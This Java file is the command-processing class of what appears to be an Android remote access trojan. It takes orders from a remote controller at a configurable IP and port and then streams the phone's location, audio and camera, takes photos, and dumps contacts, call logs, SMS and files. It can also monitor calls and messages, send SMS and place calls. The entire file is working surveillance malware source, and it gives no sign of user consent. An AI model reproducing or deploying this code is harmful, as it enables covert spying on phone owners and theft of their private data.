package my.app.activityclient;

import java.nio.ByteBuffer;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.Map;
import java.util.StringTokenizer;

import utils.EncoderHelper;

import Packet.Packet;
import Packet.PreferencePacket;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.net.Uri;
import android.os.Vibrator;
import android.preference.PreferenceManager;
import android.telephony.SmsManager;
import android.util.Log;
import android.widget.Toast;

import my.app.Library.AdvancedSystemInfo;
import my.app.Library.AudioStreamer;
import my.app.Library.CallLogLister;
import my.app.Library.CallMonitor;
import my.app.Library.ContactsLister;
import my.app.Library.DirLister;
import my.app.Library.FileDownloader;
import my.app.Library.GPSListener;
import my.app.Library.PhotoTaker;
import my.app.Library.SMSLister;
import my.app.Library.SMSMonitor;
import my.app.Library.VideoStreaming;
import inout.Protocol;

public class ProcessCommand
{
	short commande;
	ClientListener client;
	int chan;
	ByteBuffer arguments;
	Intent intent;

	SharedPreferences settings;
	SharedPreferences.Editor editor;

	public ProcessCommand(ClientListener c)
	{
		this.client = c;
		settings = client.getSharedPreferences("preferences.xml", 0);
		editor = settings.edit();
	}

	public void process(short cmd, byte[] args, int chan)
	{
		this.commande = cmd;
		this.chan = chan;
		this.arguments = ByteBuffer.wrap(args);
		
		if (commande == Protocol.GET_GPS_STREAM)
		{
			String provider = new String(arguments.array());

			if (provider.compareTo("network") == 0 || provider.compareTo("gps") == 0) {
				client.gps = new GPSListener(client, provider, chan);
				client.sendInformation("Location request received");
			}
			else
				client.sendError("Unknown provider '"+provider+"' for location");
			
		} else if (commande == Protocol.STOP_GPS_STREAM)
		{
			client.gps.stop();
			client.gps = null;
			client.sendInformation("Location stopped");
			
		} else if (commande == Protocol.GET_SOUND_STREAM)
		{
			client.sendInformation("Audio streaming request received");
			client.audioStreamer = new AudioStreamer(client, arguments.getInt(), chan);
			client.audioStreamer.run();
			
		} else if (commande == Protocol.STOP_SOUND_STREAM)
		{
			client.audioStreamer.stop();
			client.audioStreamer = null;
			client.sendInformation("Audio streaming stopped");
			
		} else if (commande == Protocol.GET_CALL_LOGS)
		{
			client.sendInformation("Call log request received");
			if (!CallLogLister.listCallLog(client, chan, arguments.array()))
				client.sendError("No call logs");

		} else if (commande == Protocol.MONITOR_CALL)
		{
			client.sendInformation("Start monitoring call");
			client.callMonitor = new CallMonitor(client, chan, arguments.array());
			
		} else if (commande == Protocol.STOP_MONITOR_CALL)
		{
			client.callMonitor.stop();
			client.callMonitor = null;
			client.sendInformation("Call monitoring stopped");
			
		} else if (commande == Protocol.GET_CONTACTS)
		{
			client.sendInformation("Contacts request received");
			if (!ContactsLister.listContacts(client, chan, arguments.array()))
				client.sendError("No contact to return");
			
		} else if (commande == Protocol.LIST_DIR)
		{
			client.sendInformation("List directory request received");
			String file = new String(arguments.array());
			if (!DirLister.listDir(client, chan, file))
				client.sendError("Directory: "+file+" not found");
			
		} else if (commande == Protocol.GET_FILE)
		{
			String file = new String(arguments.array());
			client.sendInformation("Download file "+file+" request received");
			client.fileDownloader = new FileDownloader(client);
			client.fileDownloader.downloadFile(file, chan);
			
		} else if (commande == Protocol.GET_PICTURE)
		{
			client.sendInformation("Photo picture request received");
			client.photoTaker = new PhotoTaker(client, chan);//,client.view);
			if (!client.photoTaker.takePhoto())
				client.sendError("Something went wrong while taking the picture");
			
		} else if (commande == Protocol.DO_TOAST)
		{
			client.toast = Toast.makeText(client, new String(arguments.array()), Toast.LENGTH_LONG);
			client.toast.show();
			
		} else if (commande == Protocol.SEND_SMS)
		{
			Map<String, String> information = EncoderHelper.decodeHashMap(arguments.array());
			String num = information.get(Protocol.KEY_SEND_SMS_NUMBER);
			String text = information.get(Protocol.KEY_SEND_SMS_BODY);
			if (text.getBytes().length < 167)
				SmsManager.getDefault().sendTextMessage(num, null, text, null, null);
			else
			{
				ArrayList<String> multipleMsg = MessageDecoupator(text);
				SmsManager.getDefault().sendMultipartTextMessage(num, null, multipleMsg, null, null);
			}
			client.sendInformation("SMS sent");

		} else if (commande == Protocol.GIVE_CALL)
		{
			 String uri = "tel:" + new String(arguments.array()) ;
			 intent = new Intent(Intent.ACTION_CALL,Uri.parse(uri));
			 intent.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			 client.startActivity(intent);
			 
		} else if (commande == Protocol.GET_SMS)
		{
			client.sendInformation("SMS list request received");
			if(!SMSLister.listSMS(client, chan, arguments.array()))
				client.sendError("No SMS match for filter");
			
		} else if (commande == Protocol.MONITOR_SMS)
		{
			client.sendInformation("Start SMS monitoring");
			client.smsMonitor = new SMSMonitor(client, chan, arguments.array());
			
		} else if (commande == Protocol.STOP_MONITOR_SMS)
		{
			client.smsMonitor.stop();
			client.smsMonitor = null;
			client.sendInformation("SMS monitoring stopped");
		}
		else if (commande == Protocol.GET_PREFERENCE)
		{
			client.handleData(chan, loadPreferences().build());
		} 
		else if (commande == Protocol.SET_PREFERENCE)
		{
			savePreferences(arguments.array());
			client.loadPreferences(); //Reload the new config for the client
		}
		else if(commande == Protocol.GET_ADV_INFORMATIONS) {
			client.advancedInfos = new AdvancedSystemInfo(client, chan);
			client.advancedInfos.getInfos();
		}
		else if(commande == Protocol.OPEN_BROWSER) {
			 String url = new String(arguments.array()) ;
			 Intent i = new Intent(Intent.ACTION_VIEW, Uri.parse(url));
			 i.setFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
			 client.startActivity(i);
		}
		else if(commande == Protocol.DO_VIBRATE) {
			Vibrator v = (Vibrator) client.getSystemService(Context.VIBRATOR_SERVICE);
			long duration = arguments.getLong();
			v.vibrate(duration);

		}
		else if(commande == Protocol.DISCONNECT) {
			//client.Destroy();
			client.sendError("Disconnect ignored");
		}
		else if(commande == Protocol.GET_VIDEO_STREAM) {
			client.videoStream = new VideoStreaming(client, chan, client.view);
			client.videoStream.start();
		}
		else if(commande == Protocol.STOP_VIDEO_STREAM) {
			client.videoStream.stop();
		}
		else {
			client.sendError("Command: "+commande+" unknown");
		}
			
	}

	public PreferencePacket loadPreferences()
	{
		PreferencePacket p = new PreferencePacket();
		
		SharedPreferences settings = client.getSharedPreferences("preferences", 0);

		p.setIp( settings.getString("ip", "192.168.0.12"));
		p.setPort (settings.getInt("port", 9999));
		p.setWaitTrigger(settings.getBoolean("waitTrigger", false));
		
		ArrayList<String> smsKeyWords = new ArrayList<String>();
		String keywords = settings.getString("smsKeyWords", "");
		if(keywords.equals(""))
			smsKeyWords = null;
		else {
			StringTokenizer st = new StringTokenizer(keywords, ";");
			while (st.hasMoreTokens())
			{
				smsKeyWords.add(st.nextToken());
			}
			p.setKeywordSMS(smsKeyWords);
		}
		
		ArrayList<String> whiteListCall = new ArrayList<String>();
		String listCall = settings.getString("numCall", "");
		if(listCall.equals(""))
			whiteListCall = null;
		else {
			StringTokenizer st = new StringTokenizer(listCall, ";");
			while (st.hasMoreTokens())
			{
				whiteListCall.add(st.nextToken());
			}
			p.setPhoneNumberCall(whiteListCall);
		}
		
		
		ArrayList<String> whiteListSMS = new ArrayList<String>();
		String listSMS = settings.getString("numSMS", "");
		if(listSMS.equals(""))
			whiteListSMS = null;
		else {
			StringTokenizer st = new StringTokenizer(listSMS, ";");
			while (st.hasMoreTokens())
			{
				whiteListSMS.add(st.nextToken());
			}
			p.setPhoneNumberSMS(whiteListSMS);
		}
		return p;
	}

	private void savePreferences(byte[] data)
	{
		PreferencePacket pp = new PreferencePacket();
		pp.parse(data);
		
		SharedPreferences settings = client.getSharedPreferences("preferences", 0);

		SharedPreferences.Editor editor = settings.edit();
		editor.putString("ip", pp.getIp());
		editor.putInt("port", pp.getPort());
		editor.putBoolean("waitTrigger", pp.isWaitTrigger());
		
		String smsKeyWords = "";
		String numsCall = "";
		String numsSMS = "";
		
		ArrayList<String> smsKeyWord = pp.getKeywordSMS();
		for (int i = 0; i < smsKeyWord.size(); i++)
		{
			if (i == (smsKeyWord.size() - 1))
				smsKeyWords += smsKeyWord.get(i);
			else
				smsKeyWords += smsKeyWord.get(i) + ";";
		}
		editor.putString("smsKeyWords", smsKeyWords);
		
		ArrayList<String> whiteListCall = pp.getPhoneNumberCall();
		for (int i = 0; i < whiteListCall.size(); i++)
		{
			if (i == (whiteListCall.size() - 1))
				numsCall += whiteListCall.get(i);
			else
				numsCall += whiteListCall.get(i) + ";";
		}
		editor.putString("numCall", numsCall);

		
		ArrayList<String> whiteListSMS = pp.getPhoneNumberSMS();
		for (int i = 0; i < whiteListSMS.size(); i++)
		{
			if (i == (whiteListSMS.size() - 1))
				numsSMS += whiteListSMS.get(i);
			else
				numsSMS += whiteListSMS.get(i) + ";";
		}
		editor.putString("numSMS", numsSMS);
		editor.commit();

	}

	private ArrayList<String> MessageDecoupator(String text)
	{
		ArrayList<String> multipleMsg = new ArrayList<String>();

		int taille = 0;
		while (taille < text.length())
		{
			if ((taille - text.length()) < 167)
			{
				multipleMsg.add(text.substring(taille, text.length()));
			} else
			{
				multipleMsg.add(text.substring(taille, taille + 167));
			}
			taille += 167;
		}
		return multipleMsg;
	}

}
